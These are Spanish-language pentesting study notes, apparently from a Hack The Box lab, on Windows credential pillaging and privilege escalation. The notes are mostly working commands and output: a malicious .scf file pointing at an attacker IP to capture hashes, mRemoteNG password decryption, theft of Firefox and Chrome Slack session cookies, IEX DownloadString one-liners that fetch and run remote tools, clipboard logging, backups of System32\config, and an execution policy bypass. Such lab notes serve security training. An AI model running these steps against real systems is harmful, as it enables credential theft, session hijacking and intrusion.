@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```
Podemos crearnos un archivo .scf, estos archivos los ejecuta el windows explorer para mostrar el desktop, ver directorios, etc. Este archivo lo ponemos en cualquier directorio que se está compartiendo
con un @ para que se ponga hasta arriba del directorio y se interprete primero y con responder obtenemos el hash del usuario

```powershell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
## Pillaging

Nuestro objetivo como pentesters es encontrar cualquier tipo de información que nos pueda ser útil para elevar nuestros privilegios dentro del sistema o dominio. Para eso podemos hacer uso de 
diferentes métodos. Primero podemos verificar que aplicaciones están instaladas en el sistema.

```powershell
C:\>dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 900E-A7ED

 Directory of C:\Program Files

07/14/2022  08:31 PM    <DIR>          .
07/14/2022  08:31 PM    <DIR>          ..
05/16/2022  03:57 PM    <DIR>          Adobe
05/16/2022  12:33 PM    <DIR>          Corsair
05/16/2022  10:17 AM    <DIR>          Google
05/16/2022  11:07 AM    <DIR>          Microsoft Office 15
07/10/2022  11:30 AM    <DIR>          mRemoteNG
07/13/2022  09:14 AM    <DIR>          OpenVPN
07/19/2022  09:04 PM    <DIR>          Streamlabs OBS
07/20/2022  07:06 AM    <DIR>          TeamViewer
               0 File(s)              0 bytes
              16 Dir(s)  351,524,651,008 bytes free
```
También podemos con powershell checar los registros de las apliciones que están instaladas.

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
```
En este caso tenemos la aplicación mRemoteNG que nos permite conectarnos por RDP, SSH VNC y otros protocolos, esta aplicación normalmente almacena su información en un archivo conCons.xml, Aquí dentro
podemos encontrar una contraseña que está cifrada y un master password que sirve para cifrar esta misma. Si no tiene una master password por defecto, podremos hacer uso de una herramienta para
intentar crackear la contraseña.

```shell
$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```
En caso de que tenga una master password y la sepanos, introducimos este comando.

```shell
$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```
### Cookies

Podemos intentar buscar cookies de los servicios que tiene el sistema, por ejemplo las aplicaciones IM como Microsoft Teams o Slacks usan cookies para guardar la sesión del usuario. Podemos buscar esas
cookies con herramientas o manualmente, como por ejemplo firefox almacen estas cookies en una base de datos cookies.sqlite encontrado en la siguiente ruta:

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
Si copiamos ese archivo, con ayuda de una herramienta podemos obtener el contenido de la base de datos.

```shell
gu3ro@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J
5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```
En chromium puede ser parecido solo que este está encriptado con DPAPI que toma varios valores del usuario y el sistema y lo encripta. Para este tipo tenemoe una herramienta que nos puede ser útil.

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done. 
```
Si encontramos un error es porque no encuentra la ruta de la base de datos, por lo que creamos una variable que apunte a la ruta donde se encuentra la db.

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
```
### Clipboard

Podemos obtener la información del clipboard por medio de la herramienta Invoke-Clipboard 

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

## Backup servers

Cuando tenemos manera de ingresar a un sistema que sirve de backup para otros hosts, podemos hacernos un backup de algún archivo del sistema y para eso usaremos la utilidad restic.exe, que sirve para
crear backups de archivos para linux, macos y windows

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```
```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```
Si queremos hacerle un backup a archivos que están en uso podemos hacer lo siguiente

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```
Con esto podemos ver todos los snapshots que hemos capturado en al backup

```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```
Finalmente hacemos un restore de todos estos y lo ponemos dentro a algún directorio de nuestro sistema.

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```
## Miscellaneous

Montaje VHDX/VMDK
Durante nuestra enumeración, a menudo nos encontraremos con archivos interesantes tanto localmente como en unidades compartidas de red. Es posible que encontremos contraseñas, claves SSH u otros datos que se pueden utilizar para facilitar nuestro acceso. La herramienta Snaffler puede ayudarnos a realizar una enumeración exhaustiva que de otro modo no podríamos realizar a mano. La herramienta busca muchos tipos de archivos interesantes, como archivos que contienen la frase "pasar" en el nombre del archivo, archivos de base de datos KeePass, claves SSH, archivos web.config y muchos más.

Tres tipos de archivos específicos de interés son .vhd, .vhdxy .vmdkfiles. Estos son Virtual Hard Disk( Virtual Hard Disk v2ambos utilizados por Hyper-V) y Virtual Machine Disk(utilizados por VMware)

Montark VDK en linux

```shell
gu3ro@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

Montar VHD/VHDX en Linux

```shell
gu3ro@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```
## Legacy Systems

Muchos sistemas ya no tiene soporte de seguridad de windows por lo que buscando podemos encontrar facilmente vulnerabilidades de estos sistemas.

```powershell
PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems
```
Si no se llego a ejecutar el script es porque hay que cambiar la política de ejecuciones de scripts 

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
```
